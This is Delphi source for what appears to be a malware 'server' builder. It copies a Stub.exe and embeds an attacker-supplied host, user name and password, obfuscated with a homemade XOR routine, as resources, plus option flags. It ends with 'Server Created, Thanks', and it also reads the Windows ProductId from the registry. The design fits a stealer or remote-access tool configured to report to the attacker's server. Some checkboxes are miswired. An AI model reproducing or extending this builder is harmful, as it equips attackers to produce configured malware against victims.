unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, jpeg, ExtCtrls, ComCtrls, XPMan, StdCtrls, Buttons;

type
  TByteArray = array of Byte;

type
  TForm1 = class(TForm)
    Image1: TImage;
    XPManifest1: TXPManifest;
    PageControl1: TPageControl;
    TabSheet2: TTabSheet;
    Label2: TLabel;
    Label3: TLabel;
    Label4: TLabel;
    Edit1: TEdit;
    Edit2: TEdit;
    Edit3: TEdit;
    BitBtn1: TBitBtn;
    GroupBox1: TGroupBox;
    CheckBox1: TCheckBox;
    CheckBox2: TCheckBox;
    CheckBox4: TCheckBox;
    save: TSaveDialog;
    CheckBox3: TCheckBox;
    TabSheet1: TTabSheet;
    RichEdit1: TRichEdit;
    CheckBox5: TCheckBox;
    procedure BitBtn1Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  HardID : String = '89578-OEM-7332157-00237';



implementation

{$R *.dfm}

function GetHardwareID():string;
var
  hOpen:    HKEY;
  sBuff:    array[0..256] of char;
  BuffSize: integer;
begin
  if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, PChar('SOFTWARE\Microsoft\Windows NT\CurrentVersion'), 0, KEY_QUERY_VALUE, hOpen)) = ERROR_SUCCESS then
  begin
    BuffSize := SizeOf(sBuff);
    RegQueryValueEx(hOpen, PChar('ProductId'), nil, nil, @sBuff, @BuffSize);
    Result := sBuff;
    RegCloseKey(hOpen);
  end;
end;

function Encrypt(sText:string; sKey:string):string;
var
c:  integer;
b:  integer;
i:  DWORD;
x:  integer;
y:  integer;
begin
  Result := '';
  y := 1;
  for i := 1 to Length(sText) do
  begin
    if y = Length(sKey) then
      y := 1
    else
      y := y + 1;
    c := Ord(sText[i]);
    b := Ord(sKey[y]);
    for x := 1 to 255 do
      c := x xor c xor 256 mod (y + 5);
    Result := Result + Char(c xor b shr 3 shl 4);
  end;
end;

function WriteRes(sServerFile: string; pFile: pointer; Size: integer; Name: String): Boolean;
var
Hand: THandle;
pwServerFile: PWideChar;
pwName: PWideChar;
begin
GetMem(pwServerFile, (Length(sServerFile) + 1) *2);
GetMem(pwName, (Length(Name) + 1) *2);
try
StringToWideChar(sServerFile, pwServerFile, Length(sServerFile) * 2);
StringToWideChar(Name, pwName, Length(Name) * 2);
Hand := BeginUpdateResourceW(pwServerFile, False);
Result := UpdateResourceW(Hand, MakeIntResourceW(10), pwName, 0, pFile, Size);
EndUpdateResourceW(Hand, False);
finally
FreeMem(pwServerFile);
FreeMem(pwName);
end;
end;

procedure TForm1.BitBtn1Click(Sender: TObject);
var
host,user,pass, ws, ats, te, fm: String;
LOCAL: String;
begin
Save.Execute;
ws:= 'enable';
ats:= 'enable';
te:= 'enable';
fm:= 'enable';
HOST := Encrypt(Edit1.Text, '#"xsa)=ID}KÒ»╗');
USER := Encrypt(Edit2.Text, '#"xsa)=ID}KÒ»╗');
PASS := Encrypt(Edit3.Text, '#"xsa)=ID}KÒ»╗');
LOCAL := ExtractFilePath(ParamStr(0));
LOCAL := LOCAL+'Stub.exe';
CopyFile(PChar(LOCAL), PChar(Save.FileName), FALSE);
WriteRes(Save.FileName, @host[1], Length(host), 'HOST');
WriteRes(Save.FileName, @user[1], Length(user), 'USER');
WriteRes(Save.FileName, @pass[1], Length(pass), 'PASS');
if checkbox2.checked then
begin
WriteRes(Save.FileName, @ws[1], Length(ws), 'WS');
end;
if checkbox3.checked then
begin
WriteRes(Save.FileName, @ats[1], Length(ats), 'ATS');
end;
if checkbox4.checked then
begin
WriteRes(Save.FileName, @te[1], Length(te), 'TE');
end;
if checkbox3.checked then
begin
WriteRes(Save.FileName, @fm[1], Length(fm), 'FM');
end;
Messagedlg('Server Created, Thanks', mtinformation,[mbOk], 0);
end;

end.
